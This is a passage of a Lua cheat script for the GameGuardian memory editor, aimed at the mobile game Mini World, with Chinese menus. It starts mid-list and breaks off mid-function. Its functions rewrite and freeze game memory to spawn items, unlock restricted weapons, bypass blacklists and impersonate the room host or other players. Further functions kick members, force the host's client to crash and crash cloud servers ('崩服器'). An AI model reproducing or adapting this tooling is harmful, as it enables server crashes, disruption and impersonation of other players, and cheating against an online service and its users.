15510冰冻激光
15511爆炸激光
15512岩石海啸
15513冰球
15518特效炸弹
15519岩浆弹
15520混乱球_15521
15051燃烧箭
15052燃烧雪球
15053泡泡球
15056熔岩弹
15057混乱弹
15058炸弹
15059冰锥[不可放置方块]
15060熔岩球
15062冰锥
15064冰炸弹
15065火炸弹
15066冰雪弹
15067紫球
15068紫箭
]]

F = gg.alert("🔰请选择🔰","🍁奖杯按钮🍁","🍁️修改物品🍁️️")
 if  F~=1 and F~=2 then
 gg.toast("你未选择开关默认取消")
    gg.toast("📌你未选择｛开 关｝")
  else 
  end
if  F== 1 then
qmnb = {
{["memory"] = 4},
{["name"] = ""},
{["value"] = 1124859904, ["type"] = 4},
{["lv"] = -1047527424, ["offset"] = -4, ["type"] = 4},
{["lv"] = 1065353216, ["offset"] = 0x38, ["type"] = 4},
{["lv"] = 1065353216, ["offset"] = -0x20, ["type"] = 4},
{["lv"] = 1113063424, ["offset"] = -0x14, ["type"] = 4},
{["lv"] = 1113063424, ["offset"] = -0x18, ["type"] = 4},
{["lv"] = 1050253722, ["offset"] = 0xA0, ["type"] = 4},
{["lv"] = 1056964608, ["offset"] = 0x98, ["type"] = 4},
{["lv"] = 16777216, ["offset"] = -0x4C, ["type"] = 4},
}
qmxg = {{["value"] = 16777472, ["offset"] = -0x4C, ["type"] = 4, ["freeze"] = true},}
xqmnb(qmnb)
gg.clearResults()
end
if F==2 then
dI=gg.prompt({"",""},{[1] = "【物品代码】15056",[2] = "【数量】999"},{[1] = "number",[2] = "number"})   
Aa1 = dI[1] Aa2 = dI[2]
qmnb = {
{["memory"] = 4},
{["name"] = ""},
{["value"] = 11012, ["type"] = 4},
{["lv"] = 2, ["offset"] = -4, ["type"] = 4},
{["lv"] = 1, ["offset"] = -8, ["type"] = 4},
{["lv"] = 5, ["offset"] = -16, ["type"] = 4},
{["lv"] = 0, ["offset"] = 20, ["type"] = 4},
{["lv"] = 0, ["offset"] = 28, ["type"] = 4},
{["lv"] = 1, ["offset"] = 32, ["type"] = 4},
{["lv"] = 11013, ["offset"] = -928, ["type"] = 4},

}
qmxg = {
{["value"] = 0, ["offset"] =4, ["type"] = 4},
{["value"] = 0, ["offset"] =8, ["type"] = 4},
{["value"] = Aa1, ["offset"] =16, ["type"] = 4},
{["value"] = Aa2, ["offset"] =24, ["type"] = 4},

{["value"] = 0, ["offset"] =-0x39C, ["type"] = 4},
{["value"] = 0, ["offset"] =-0x398, ["type"] = 4},
{["value"] = Aa1, ["offset"] =-0x390, ["type"] = 4},
{["value"] = Aa2, ["offset"] =-0x388, ["type"] = 4},

{["value"] = 0, ["offset"] =-0x73C, ["type"] = 4},
{["value"] = 0, ["offset"] =-0x738, ["type"] = 4},
{["value"] = Aa1, ["offset"] =-0x730, ["type"] = 4},
{["value"] = Aa2, ["offset"] =-0x728, ["type"] = 4},

{["value"] = 0, ["offset"] =-0xADC, ["type"] = 4},
{["value"] = 0, ["offset"] =-0xAD8, ["type"] = 4},
{["value"] = Aa1, ["offset"] =-0xAD0, ["type"] = 4},
{["value"] = Aa2, ["offset"] =-0xAC8, ["type"] = 4},

{["value"] = 0, ["offset"] =-0xE7C, ["type"] = 4},
{["value"] = 0, ["offset"] =-0xE78, ["type"] = 4},
{["value"] = Aa1, ["offset"] =-0xE70, ["type"] = 4},
{["value"] = Aa2, ["offset"] =-0xE68, ["type"] = 4},

{["value"] = 0, ["offset"] =-0x121C, ["type"] = 4},
{["value"] = 0, ["offset"] =-0x1218, ["type"] = 4},
{["value"] = Aa1, ["offset"] =-0x1210, ["type"] = 4},
{["value"] = Aa2, ["offset"] =-0x1208, ["type"] = 4},

{["value"] = 0, ["offset"] =-0x15BC, ["type"] = 4},
{["value"] = 0, ["offset"] =-0x15B8, ["type"] = 4},
{["value"] = Aa1, ["offset"] =-0x15B0, ["type"] = 4},
{["value"] = Aa2, ["offset"] =-0x15A8, ["type"] = 4},

{["value"] = 0, ["offset"] =-0x195C, ["type"] = 4},
{["value"] = 0, ["offset"] =-0x1958, ["type"] = 4},
{["value"] = Aa1, ["offset"] =-0x1950, ["type"] = 4},
{["value"] = Aa2, ["offset"] =-0x1948, ["type"] = 4},

{["value"] = 0, ["offset"] =-0x1CFC, ["type"] = 4},
{["value"] = 0, ["offset"] =-0x1CF8, ["type"] = 4},
{["value"] = Aa1, ["offset"] =-0x1CF0, ["type"] = 4},
{["value"] = Aa2, ["offset"] =-0x1CE8, ["type"] = 4},

{["value"] = 0, ["offset"] =-0x209C, ["type"] = 4},
{["value"] = 0, ["offset"] =-0x2098, ["type"] = 4},
{["value"] = Aa1, ["offset"] =-0x2090, ["type"] = 4},
{["value"] = Aa2, ["offset"] =-0x2088, ["type"] = 4},

{["value"] = 0, ["offset"] =-0x243C, ["type"] = 4},
{["value"] = 0, ["offset"] =-0x2438, ["type"] = 4},
{["value"] = Aa1, ["offset"] =-0x2430, ["type"] = 4},
{["value"] = Aa2, ["offset"] =-0x2428, ["type"] = 4},

{["value"] = 0, ["offset"] =-0x27DC, ["type"] = 4},
{["value"] = 0, ["offset"] =-0x27D8, ["type"] = 4},
{["value"] = Aa1, ["offset"] =-0x27D0, ["type"] = 4},
{["value"] = Aa2, ["offset"] =-0x27C8, ["type"] = 4},

{["value"] = 0, ["offset"] =-0x2B7C, ["type"] = 4},
{["value"] = 0, ["offset"] =-0x2B78, ["type"] = 4},
{["value"] = Aa1, ["offset"] =-0x2B70, ["type"] = 4},
{["value"] = Aa2, ["offset"] =-0x2B68, ["type"] = 4},

 }
xqmnb(qmnb)
end
end



function zt17()
qmnb = {
{["memory"] = 4},
{["name"] = "其他成就无限领"},
{["value"] = 1221, ["type"] = 4},
{["lv"] = 2, ["offset"] = 8, ["type"] = 4},
{["lv"] = 0, ["offset"] = 12, ["type"] = 4}}
qmxg = {
{["value"] = 1, ["offset"] = 12, ["type"] = 4, ["freeze"] = true},

}
xqmnb(qmnb)
end

function yf1()
qmnb = {
{["memory"] = 4},
{["name"] = "云服重启"},
{["value"] = 4842495500454461440, ["type"] =32 },
{["lv"] = 1127481344, ["offset"] = 4, ["type"] = 4},
{["lv"] = 1106247680, ["offset"] = 0x14, ["type"] = 4},
{["lv"] = 1065353216, ["offset"] = 0x50, ["type"] = 4},
{["lv"] = 1065353216, ["offset"] = -0x8, ["type"] = 4},
}
qmxg = {
{["value"] = 12345, ["offset"] = 0xD4, ["type"] = 4, ["freeze"] = true},
{["value"] = 16777472, ["offset"] = -0x34, ["type"] = 4, ["freeze"] = true},
}
xqmnb(qmnb)
gg.clearResults()
end

function yf2()
b31a= gg.prompt({"输入服主迷你号"},{[1]=0},{[1]="text"})[1]
qmnb = {
{["memory"] = 4},
{["name"] = "伪装房主"},
{["value"] = b31a, ["type"] = 4},
{["lv"] = 2, ["offset"] = 44, ["type"] = 4},
}
qmxg = {
{["value"] = 4, ["offset"] = 44, ["type"] = 4},
}
xqmnb(qmnb)
gg.clearResults()
end

function yf3()
qmnb = {
{["memory"] = 4},
{["name"] = "崩溃数据进行中"},
{["value"] = 220, ["type"] = 4},
{["lv"] = 60, ["offset"] = -16, ["type"] = 4},
{["lv"] = 180, ["offset"] = -12, ["type"] = 4},
{["lv"] = 120, ["offset"] = -4, ["type"] = 4},
{["lv"] = 120, ["offset"] = 4, ["type"] = 4},
}
qmxg = {
{["value"] = 99999, ["offset"] = 8, ["type"] = 4},
{["value"] = 1629379373937, ["offset"] = 12, ["type"] = 4},
{["value"] = 17297393, ["offset"] = 16, ["type"] = 4},
} xqmnb(qmnb)
qmnb = {
{["memory"] = 4},
{["name"] = "崩溃数据进行中"},
{["value"] = 220, ["type"] = 4},
{["lv"] = 60, ["offset"] = -16, ["type"] = 4},
{["lv"] = 180, ["offset"] = -12, ["type"] = 4},
{["lv"] = 120, ["offset"] = -4, ["type"] = 4},
{["lv"] = 120, ["offset"] = 4, ["type"] = 4},
}
qmxg = {
{["value"] = 99999, ["offset"] = 8, ["type"] = 4},
{["value"] = 16373937, ["offset"] = 12, ["type"] = 4},
{["value"] = 17297393, ["offset"] = 16, ["type"] = 4},
} xqmnb(qmnb)qmnb = {
{["memory"] = 4},
{["name"] = "崩溃数据进行中"},
{["value"] = 220, ["type"] = 4},
{["lv"] = 60, ["offset"] = -16, ["type"] = 4},
{["lv"] = 180, ["offset"] = -12, ["type"] = 4},
{["lv"] = 120, ["offset"] = -4, ["type"] = 4},
{["lv"] = 120, ["offset"] = 4, ["type"] = 4},
}
qmxg = {
{["value"] = 99999, ["offset"] = 8, ["type"] = 4},
{["value"] = 162373937, ["offset"] = 12, ["type"] = 4},
{["value"] = 17297393, ["offset"] = 16, ["type"] = 4},
} xqmnb(qmnb)qmnb = {
{["memory"] = 4},
{["name"] = "崩溃数据进行中"},
{["value"] = 220, ["type"] = 4},
{["lv"] = 60, ["offset"] = -16, ["type"] = 4},
{["lv"] = 180, ["offset"] = -12, ["type"] = 4},
{["lv"] = 120, ["offset"] = -4, ["type"] = 4},
{["lv"] = 120, ["offset"] = 4, ["type"] = 4},
}
qmxg = {
{["value"] = 99999, ["offset"] = 8, ["type"] = 4},
{["value"] = 162937973937, ["offset"] = 12, ["type"] = 4},
{["value"] = 17297393, ["offset"] = 16, ["type"] = 4},
} xqmnb(qmnb)qmnb = {
{["memory"] = 4},
{["name"] = "崩溃数据进行中"},
{["value"] = 220, ["type"] = 4},
{["lv"] = 60, ["offset"] = -16, ["type"] = 4},
{["lv"] = 180, ["offset"] = -12, ["type"] = 4},
{["lv"] = 120, ["offset"] = -4, ["type"] = 4},
{["lv"] = 120, ["offset"] = 4, ["type"] = 4},
}
qmxg = {
{["value"] = 99999, ["offset"] = 8, ["type"] = 4},
{["value"] = 162937973937, ["offset"] = 12, ["type"] = 4},
{["value"] = 17297393, ["offset"] = 16, ["type"] = 4},
} xqmnb(qmnb)qmnb = {
{["memory"] = 4},
{["name"] = "崩溃数据进行中"},
{["value"] = 220, ["type"] = 4},
{["lv"] = 60, ["offset"] = -16, ["type"] = 4},
{["lv"] = 180, ["offset"] = -12, ["type"] = 4},
{["lv"] = 120, ["offset"] = -4, ["type"] = 4},
{["lv"] = 120, ["offset"] = 4, ["type"] = 4},
}
qmxg = {
{["value"] = 99999, ["offset"] = 8, ["type"] = 4},
{["value"] = 162379373937, ["offset"] = 12, ["type"] = 4},
{["value"] = 17297393, ["offset"] = 16, ["type"] = 4},
} xqmnb(qmnb)

end

function yf4()

function S_Pointer(t_So, t_Offset, _bit)
	local function getRanges()
		local ranges = {}
		local t = gg.getRangesList('^/data/*.so*$')
		for i, v in pairs(t) do
			if v.type:sub(2, 2) == 'w' then
				table.insert(ranges, v)
			end
		end
		return ranges
	end
	local function Get_Address(N_So, Offset, ti_bit)
		local ti = gg.getTargetInfo()
		local S_list = getRanges()
		local _Q = tonumber(0x167ba0fe)
		local t = {}
		local _t
		local _S = nil
		if ti_bit then
			_t = 32
		 else
			_t = 4
		end
		for i in pairs(S_list) do
			local _N = S_list[i].internalName:gsub('^.*/', '')
			if N_So[1] == _N and N_So[2] == S_list[i].state then
				_S = S_list[i]
				break
			end
		end
		if _S then
			t[#t + 1] = {}
			t[#t].address = _S.start + Offset[1]
			t[#t].flags = _t
			if #Offset ~= 1 then
				for i = 2, #Offset do
					local S = gg.getValues(t)
					t = {}
					for _ in pairs(S) do
						if not ti.x64 then
							S[_].value = S[_].value & 0xFFFFFFFF
						end
						t[#t + 1] = {}
						t[#t].address = S[_].value + Offset[i]
						t[#t].flags = _t
					end
				end
			end
			_S = t[#t].address
			print(string.char(231,190,164,58).._Q)
		end
		return _S
	end
	local _A = string.format('0x%X', Get_Address(t_So, t_Offset, _bit))
	return _A
end



local t = {"libAppPlayJNI.so:bss", "Cb"}
local tt = {0x28A21C, 0x0, 0xA4, 0xE4}
local ttt = S_Pointer(t, tt)
gg.setValues({{address = ttt, flags = 16, value = 1}})
end

function c1()
	 gg.clearResults()
	 gg.setRanges(262207)
	 gg.searchNumber("11011", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
	 gg.searchNumber("11011", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
	 jg=gg.getResults(100)
	 sl=gg.getResultCount()
	 for i = 1, sl do
	 	 dzy=jg[i].address
	 	 gg.addListItems({[1] = {address = dzy,flags = gg.TYPE_DWORD,freeze = true,value = 12005}})
	 end
	 gg.toast("删除备份成功，已注入一项数据")
	 gg.clearResults()
end

 function c2()
gg.alert("开启成功后召唤小泡沫，房主直接闪退迷你","开启️️")
qmnb = {
{["memory"] = 4},
{["name"] = "踢房主开启成功"},
{["value"] = 10003, ["type"] = 4},
{["lv"] = 10001, ["offset"] = 72, ["type"] = 4},
{["lv"] = 10, ["offset"] = 20, ["type"] = 4},
{["lv"] = 15, ["offset"] = 16, ["type"] = 4},
{["lv"] = 10, ["offset"] = 12, ["type"] = 4},
{["lv"] = 10, ["offset"] = 28, ["type"] = 4},
{["lv"] = 1, ["offset"] = 88, ["type"] = 4},
}
qmxg = {{["value"] = 3513, ["offset"] = 80, ["type"] = 4},}
xqmnb(qmnb)
gg.clearResults()
end

function c3()
  gg.toast("请在10秒内复制你想踢的人迷你号")
  gg.sleep(10000)
b = gg.prompt({"请输入你想踢的人迷你号"}
,{[1]=0},{[1]="number"})[1]
qmnb = {
{["memory"] = 4},
{["name"] = "踢成员"},
{["value"] = zh, ["type"] = 4},
{["lv"] = 65535, ["offset"] = 24, ["type"] = 4},}
qmxg = {
{["value"] = b, ["offset"] = 0, ["type"] = 4, ["freeze"] = true},
}
xqmnb(qmnb)
 while  true do 
    gg.sleep(100)
        gg.toast("警告\n[现在请你在评论区发一条消息]\n［不按要求的会出现bug］\n发完后单点修改器继续！")
if gg.isVisible(true) then 
gg.setVisible(false) 
qmnb = {
{["memory"] = 4},
{["name"] = "踢成员"},
{["value"] = b, ["type"] = 4},
{["lv"] = 65535, ["offset"] = 24, ["type"] = 4},}
qmxg = {
{["value"] = zh, ["offset"] = 0, ["type"] = 4, ["freeze"] = true},
}
xqmnb(qmnb)
 while  true do 
if gg.isVisible(true) then 
gg.setVisible(false)
gg.clearResults()
end end end end end

function c4()
F = gg.alert("请提前复制你的迷你号，开启成功后你说的话就等于房主说的","🌞确认开启🌞")
if  F~=1 then
gg.toast("你未选择确认开启")
else 
end
if  F== 1 then
gg.alert("现在去复制房主的迷你号 10秒后会自动弹出窗口","🌞去复制🌞")
gg.sleep(10000)
b = gg.prompt({"请输入房主迷你号"}
,{[1]=0},{[1]="number"})[1]
qmnb = {
{["memory"] = 4},
{["name"] = "踢房主"},
{["value"] = zh, ["type"] = 4},
{["lv"] = 65535, ["offset"] = 24, ["type"] = 4},}
qmxg = {
{["value"] = b, ["offset"] = 0, ["type"] = 4, ["freeze"] = true},
}
xqmnb(qmnb)
end
end

function c5()
SN = gg.choice({
     "开启崩服器",
     "关闭崩服器(查看效果)",
     "超级崩服器(请先开启崩服器)",
}, nil, "2021年7月22日拿上外挂去炸迷你")
if SN==1 then
     E2a1()
end
if SN==2 then
     E2a2()
end
if SN==3 then
     E2a3()
end
FX1=0
end

function E2a1()
function bf(qmnb,qmxg)
gg.setVisible(false)
gg.clearResults()
qmnbv=qmnb[3]["value"]or qmnb[3][1]qmnbt=qmnb[3]["type"]or qmnb[3][2]qmnbn=qmnb[2]["name"]or qmnb[2][1]gg.setRanges(qmnb[1]["memory"]or qmnb[1][1])
gg.searchNumber(qmnbv,qmnbt)
gg.refineNumber(qmnbv,qmnbt)
sz=gg.getResultCount()
if sz==0 then
gg.toast(qmnbn.."开启失败，请尝试重启游戏")
else
sl=gg.getResults(999999)
for i=1,sz do
pdsz=true
for v=4,#qmnb do
if pdsz==true then
pysz={{}}pysz[1].address=sl[i].address+(qmnb[v]["offset"]or qmnb[v][2])pysz[1].flags=qmnb[v]["type"]or qmnb[v][3]szpy=gg.getValues(pysz)tzszpd=tostring(qmnb[v]["lv"]or qmnb[v][1]):gsub(",","")
pyszpd=tostring(szpy[1].value):gsub(",","")
if tzszpd==pyszpd then 
pdjg=true pdsz=true
else
pdjg=false
pdsz=false
end
end
end
if pdjg==true then
szpy=sl[i].address
for x=1,#qmxg do
xgsz=qmxg[x]["value"]or qmxg[x][1]xgpy=szpy+(qmxg[x]["offset"]or qmxg[x][2])xglx=qmxg[x]["type"]or qmxg[x][3]xgdj=qmxg[x]["freeze"]or qmxg[x][4]xg={{address=xgpy,flags=xglx,value=xgsz}}
if xgdj==true then
xg[1].freeze=xgdj
gg.addListItems(xg)
else
gg.setValues(xg)
end
end
xgjg=true
end 
end
if xgjg==true then
gg.toast(qmnbn.."开启成功,共注入 2 条冻结数据")
else 
gg.toast(qmnbn.."开启失败，请尝试重启游戏")
end
end
end
bf(
{
{4},
{"崩服器"}, 
{773094113340, gg.TYPE_QWORD},
{220, 16, gg.TYPE_DWORD}, 
},
{
{-10000, 28, gg.TYPE_DWORD, true},
}
)
     gg.clearResults()
end

function E2a2()
	 gg.clearResults()
	 gg.setRanges(4)
	 gg.searchNumber("16777472;16777216;16777472;16777216", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
	 gg.searchNumber("99999", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
	 gg.getResults(100)
	 gg.toast("时间已过，自动卡爆云服")
     gg.clearResults()
     Main0()
end

function E2a3()
     function jiuyan(qmnb,qmxg)
gg.setVisible(false)
gg.clearResults()
qmnbv=qmnb[3]["value"]or qmnb[3][1]qmnbt=qmnb[3]["type"]or qmnb[3][2]qmnbn=qmnb[2]["name"]or qmnb[2][1]gg.setRanges(qmnb[1]["memory"]or qmnb[1][1])
gg.searchNumber(qmnbv,qmnbt)
gg.refineNumber(qmnbv,qmnbt)
sz=gg.getResultCount()
if sz==0 then
gg.toast(qmnbn.."开启失败，请尝试重启游戏")
else
sl=gg.getResults(999999)
for i=1,sz do
pdsz=true
for v=4,#qmnb do
if pdsz==true then
pysz={{}}pysz[1].address=sl[i].address+(qmnb[v]["offset"]or qmnb[v][2])pysz[1].flags=qmnb[v]["type"]or qmnb[v][3]szpy=gg.getValues(pysz)tzszpd=tostring(qmnb[v]["lv"]or qmnb[v][1]):gsub(",","")
pyszpd=tostring(szpy[1].value):gsub(",","")
if tzszpd==pyszpd then 
pdjg=true pdsz=true
else
pdjg=false
pdsz=false
end
end
end
if pdjg==true then
szpy=sl[i].address
for x=1,#qmxg do
xgsz=qmxg[x]["value"]or qmxg[x][1]xgpy=szpy+(qmxg[x]["offset"]or qmxg[x][2])xglx=qmxg[x]["type"]or qmxg[x][3]xgdj=qmxg[x]["freeze"]or qmxg[x][4]xg={{address=xgpy,flags=xglx,value=xgsz}}
if xgdj==true then
xg[1].freeze=xgdj
gg.addListItems(xg)
else
gg.setValues(xg)
end
end
xgjg=true
end 
end
if xgjg==true then
gg.toast(qmnbn.."开启成功,共注入 2 条冻结数据")
else 
gg.toast(qmnbn.."开启失败，请尝试重启游戏")
end
end
end
jiuyan(
{
{4},
{"崩服器升级"}, 
{773094113340, gg.TYPE_QWORD},
{220, 16, gg.TYPE_DWORD},  
},
{
{1000, 32, gg.TYPE_DWORD, true},
}
)
     gg.clearResults()
end

function c6()
gg.toast("请选择开关")
F = gg.alert("🔰请选择｛开 关｝🔰","🍁开🍁","🍁️关🍁️️")
 if  F~=1 and F~=2 then
 gg.toast("你未选择开关默认取消")
    gg.toast("📌你未选择｛开 关｝")
  else 
  end
if  F== 1 then
t = gg.prompt({"『输入别人的迷你号』"}
,{[1]=0},{[1]="number"})[1]
gg.clearResults()
qmnb = {
{["memory"] = 4},
{["name"] = "附身别人"},
{["value"] = a, ["type"] = 4},
{["lv"] = 16777473, ["offset"] = -64, ["type"] = 4},}
qmxg = {
{["value"] = t, ["offset"] = 0, ["type"] = 4},
}
xqmnb(qmnb)
gg.clearResults()
 elseif F == 2 then
 t = gg.prompt({"『输入别人的迷你号』"}
,{[1]=0},{[1]="number"})[1]
gg.clearResults()
qmnb = {
{["memory"] = 4},
{["name"] = "附身别人解除"},
{["value"] = t, ["type"] = 4},
{["lv"] = 16777473, ["offset"] = -64, ["type"] = 4},}
qmxg = {
{["value"] = a, ["offset"] = 0, ["type"] = 4},
}
xqmnb(qmnb)
end
end



function c7()
	 gg.clearResults()
	 gg.setRanges(262207)
	 gg.searchNumber("300.0;999.0:17", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
	 gg.searchNumber("300", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
	 jg=gg.getResults(100)
	 sl=gg.getResultCount()
	 if sl>100 then sl=100 end
	 for i = 1, sl do
	 	 dzy=jg[i].address
	 	 gg.addListItems({[1] = {address = dzy,flags = gg.TYPE_DOUBLE,freeze = true,value = 0}})
	 end
	 gg.toast("免手机号打字-吃屎完成")
	 gg.clearResults()
end

function c8()
gg.alert("教程:在被拉黑的界面开启功能，退出，再回到那个地图，你会发现没有被拉黑了")
  gg.clearResults()
  gg.setRanges(262207)
  gg.searchNumber("16777472", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
  gg.toast("现在退出地图，点击辅助悬浮窗")
  while true do
    if gg.isVisible(true) then
      gg.setVisible(false)
      gg.searchNumber("16777216", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
      gg.toast("现在再回到地图，点击辅助悬浮窗")
      while true do
        if gg.isVisible(true) then
          gg.setVisible(false)
          gg.searchNumber("16777472", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
          jg=gg.getResults(100)
          sl=gg.getResultCount()
          if sl>100 then sl=100 end
          for i = 1, sl do
            dzy=jg[i].address
            gg.addListItems({[1] = {address = dzy,flags = gg.TYPE_DWORD,freeze = true,value = 16777216}})
          end
            gg.toast("无视拉黑开启成功（只能用一次，其他要重新开这个功能）")
            gg.clearResults()
           break
          end
        end
        break
      end
    end
  end

function c9()
gg.alert("使用教程:去迷你工坊下个跑酷地图，开房间，随便点击个物品，弹出重置模式（忘了）退出去，再解锁，你发现进其他房间所有危险品都可以用了")
SN = gg.multiChoice({
	 "解锁火箭背包",
	 "解锁火箭筒",
	 "解锁弩",
	 "解锁大爆竹",
	 "解锁弹弓",
	 "解锁公主床",
	 "解锁豪华木床",
	 "返回主页",
	 "退出脚本",
}, nil, "解锁各种物品")
if SN[1]==true then
	 HS4()
end
if SN[2]==true then
	 HS8()
end
if SN[3]==true then
	 HS9()
end
if SN[4]==true then
	 HS10()
end
if SN[5]==true then
	 HS11()
end
if SN[6]==true then
	 HS12()
end
if SN[7]==true then
	 HS13()
end
if SN[8]==true then
	 HS5()
end
if SN[9]==true then
	 HS6()
end
FX1=0
end

function HS4()
	 gg.clearResults()
	 gg.setRanges(262207)
	 gg.searchNumber("12253;91", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
	 gg.searchNumber("91", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
	 jg=gg.getResults(100)
	 sl=gg.getResultCount()
	 if sl>100 then sl=100 end
	 for i = 1, sl do
	 	 dzy=jg[i].address
	 	 gg.addListItems({[1] = {address = dzy,flags = gg.TYPE_DWORD,freeze = true,value = 0}})
	 end
	 gg.toast("解锁火箭背包-修改完成")
	 gg.clearResults()
end

function HS8()
	 gg.clearResults()
	 gg.setRanges(262207)
	 gg.searchNumber("12284;62", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
	 gg.searchNumber("62", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
	 jg=gg.getResults(100)
	 sl=gg.getResultCount()
	 if sl>100 then sl=100 end
	 for i = 1, sl do
	 	 dzy=jg[i].address
	 	 gg.addListItems({[1] = {address = dzy,flags = gg.TYPE_DWORD,freeze = true,value = 0}})
	 end
	 gg.toast("解锁火箭筒-修改完成")
	 gg.clearResults()
end

function HS9()
	 gg.clearResults()
	 gg.setRanges(262207)
	 gg.searchNumber("12283;61", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
	 gg.searchNumber("61", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
	 jg=gg.getResults(100)
	 sl=gg.getResultCount()
	 if sl>100 then sl=100 end
	 for i = 1, sl do
	 	 dzy=jg[i].address
	 	 gg.addListItems({[1] = {address = dzy,flags = gg.TYPE_DWORD,freeze = true,value = 0}})
	 end
	 gg.toast("解锁弩-修改完成")
	 gg.clearResults()
end

function HS10()
	 gg.clearResults()
	 gg.setRanges(262207)
	 gg.searchNumber("12280;59", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
	 gg.searchNumber("59", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
	 jg=gg.getResults(100)
	 sl=gg.getResultCount()
	 if sl>100 then sl=100 end
	 for i = 1, sl do
	 	 dzy=jg[i].address
	 	 gg.addListItems({[1] = {address = dzy,flags = gg.TYPE_DWORD,freeze = true,value = 0}})
	 end
	 gg.toast("解锁大爆竹-修改完成")
	 gg.clearResults()
end

function HS11()
	 gg.clearResults()
	 gg.setRanges(262207)
	 gg.searchNumber("12281;60", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
	 gg.searchNumber("60", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
	 jg=gg.getResults(100)
	 sl=gg.getResultCount()
	 if sl>100 then sl=100 end
	 for i = 1, sl do
	 	 dzy=jg[i].address
	 	 gg.addListItems({[1] = {address = dzy,flags = gg.TYPE_DWORD,freeze = true,value = 0}})
	 end
	 gg.toast("解锁弹弓-修改完成")
	 gg.clearResults()
end

function HS12()
	 gg.clearResults()
	 gg.setRanges(262207)
	 gg.searchNumber("885;32", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
	 gg.searchNumber("32", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
	 jg=gg.getResults(100)
	 sl=gg.getResultCount()
	 if sl>100 then sl=100 end
	 for i = 1, sl do
	 	 dzy=jg[i].address
	 	 gg.addListItems({[1] = {address = dzy,flags = gg.TYPE_DWORD,freeze = true,value = 0}})
	 end
	 gg.toast("解锁公主床-修改完成")
	 gg.clearResults()
end

function HS13()
	 gg.clearResults()
	 gg.setRanges(262207)
	 gg.searchNumber("884;31", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
	 gg.searchNumber("31", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
	 jg=gg.getResults(100)
	 sl=gg.getResultCount()
	 if sl>100 then sl=100 end
	 for i = 1, sl do
	 	 dzy=jg[i].address
	 	 gg.addListItems({[1] = {address = dzy,flags = gg.TYPE_DWORD,freeze = true,value = 0}})
	 end
	 gg.toast("解锁豪华木床-修改完毕")
	 gg.clearResults()
end

function HS5()
	 Main0()
end

function HS6()
	 os.exit()
end

function c10()
gg.alert("狗作者修复了本功能，本功能教程:找到你对应的等级，确定，就可以了，注意:本功能只能领徽章，其余的没啥用")
SN = gg.choice({
	 "家园等级1",
	 "家园等级2",
	 "家园等级3",
	 "家园等级4",
	 "家园等级5",
	 "家园等级6",
}, nil, "表面上他爱着你，但他早就跟别人去了")
if SN==1 then
	 HS3()
end
if SN==2 then
	 HS4()
end
if SN==3 then
	 HS5()
end
if SN==4 then
	 HS6()
end
if SN==5 then
	 HS7()
end
if SN==6 then
	 HS8()
end
FX1=0
end

function HS3()
	 gg.clearResults()
	 gg.setRanges(262207)
	 gg.searchNumber("1;70", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
	 gg.searchNumber("1", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
	 gg.getResults(10)
	 gg.editAll("25", gg.TYPE_DOUBLE)
	 gg.toast("年轻人，千万不要砍这棵树")
	 gg.clearResults()
end

function HS4()
	 gg.clearResults()
	 gg.setRanges(262207)
	 gg.searchNumber("", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
	 gg.searchNumber("", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
	 gg.getResults(100)
	 gg.editAll("", gg.TYPE_DOUBLE)
	 gg.toast("我离开一下")
	 gg.clearResults()
end

function HS5()
	 gg.clearResults()
	 gg.setRanges(262207)
	 gg.searchNumber("", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
	 gg.searchNumber("", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
	 gg.getResults(100)
	 gg.editAll("", gg.TYPE_DOUBLE)
	 gg.toast("过了10年")
	 gg.clearResults()
end

function HS6()
	 gg.clearResults()
	 gg.setRanges(262207)
	 gg.searchNumber("4;140", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
	 gg.searchNumber("4", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
	 gg.getResults(100)
	 gg.editAll("25", gg.TYPE_DOUBLE)
	 gg.toast("这个人还没回来了")
	 gg.clearResults()
end

function HS7()
	 gg.clearResults()
	 gg.setRanges(262207)
	 gg.searchNumber("", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
	 gg.searchNumber("", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
	 gg.getResults(100)
	 gg.editAll("", gg.TYPE_DOUBLE)
	 gg.toast("说好的只离开一下，却失信了")
	 gg.clearResults()
end

function HS8()
	 gg.clearResults()
	 gg.setRanges(262207)
	 gg.searchNumber("6;260", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
	 gg.searchNumber("6", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
	 gg.getResults(100)
